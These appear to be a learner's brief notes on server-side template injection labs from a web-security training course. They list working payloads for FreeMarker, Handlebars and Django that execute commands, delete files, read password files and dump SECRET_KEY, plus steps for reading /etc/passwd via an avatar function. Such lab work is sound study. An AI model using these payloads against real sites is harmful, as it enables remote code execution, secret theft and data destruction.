lab1: Ruby ERB document


lab2: tornado

lab3: freemarker
	payload:
<#assign ex="freemarker.template.utility.Execute()"?new()> ${ ex("rm morale.txt") }

lab4: handlebars
payload:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}


lab5: django

{% debug %}

{{ settings.SECRET_KEY }}

lab6: freemarker template engine (hard)

notice use object : user
try to access object, sequence file to grant access to static metho that leds tou read a file.
read payload hacktricks
	payload:
	${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}


lab7: with a custom exploit (hard)
notice SSTI in set name user
notice upload error img => take file upload.php, user.setAvatar() => try to read this one
try to user.setAvatar('/etc/passwd') => get avatar => success exploit
now need a method to delete file through img or name ....
try to read file upload.php => detect user.gdprDelete() can  delete link avatar  
idea: add file need to be deleted to avatar, delete avatar => success delete file


